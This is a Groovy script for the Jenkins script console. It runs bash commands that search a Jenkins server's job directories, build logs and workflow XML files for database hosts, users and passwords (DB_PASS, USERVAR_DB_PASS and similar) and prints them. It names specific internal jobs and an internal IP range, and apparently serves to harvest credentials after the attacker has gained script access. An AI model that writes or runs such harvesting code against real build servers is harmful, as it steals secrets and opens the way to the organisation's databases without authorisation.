// MICRO-J: Read build logs for USERVAR values (caja-api most recent builds)
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer(); def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(20000)
    out.toString().take(5000)
}

// Find most recent builds with USERVAR values
println "=== RECENT BUILD LOGS with USERVAR ==="
def r1 = run('find /var/jenkins_home/jobs/cs_legacy_front -name "log" -newer /var/jenkins_home/jobs/cs_legacy_front/jobs/cs_legacy_pipe_build_caja-api/builds/884/log 2>/dev/null | head -5')
println "Recent logs: ${r1}"

// Read most recent caja-api build log
println "\n=== CAJA-API latest log (USERVAR dump) ==="
def r2 = run('find /var/jenkins_home/jobs/cs_legacy_front/jobs/cs_legacy_pipe_build_caja-api/builds -name "log" 2>/dev/null | sort -V | tail -1 | xargs grep -A2 -B2 "USERVAR\\|DB_HOST\\|DB_PASS\\|withEnv" 2>/dev/null | head -80')
println r2 ?: "(nothing)"

// Read tienda build log for USERVAR
println "\n=== TIENDA latest log (USERVAR dump) ==="
def r3 = run('find /var/jenkins_home/jobs/cs_legacy_front/jobs/cs_legacy_pipe_build_tienda/builds -name "log" 2>/dev/null | sort -V | tail -1 | xargs grep -E "USERVAR_DB|mrc-services|172\\.27\\.141|apifincadob" 2>/dev/null | head -30')
println r3 ?: "(nothing)"

// Look for USERVAR in ALL recent build logs
println "\n=== ALL USERVAR_DB VALUES IN BUILD LOGS ==="
def r4 = run('grep -rh "USERVAR_DB_HOST\\|USERVAR_DB_PASS\\|USERVAR_DB_USER" /var/jenkins_home/jobs/ 2>/dev/null | grep -v "^\\s*#\\|defaultValue\\|<name>\\|<description>" | sort -u | head -40')
println r4 ?: "(nothing)"

// Also look at workflow XML files (they capture env)
println "\n=== WORKFLOW XMLs with USERVAR values ==="
def r5 = run('grep -roh "USERVAR_DB_[A-Z_]*=[^<\"& ]*" /var/jenkins_home/jobs/ 2>/dev/null | sort -u | head -30')
println r5 ?: "(nothing)"

println "\n=== DONE MICRO-J ==="
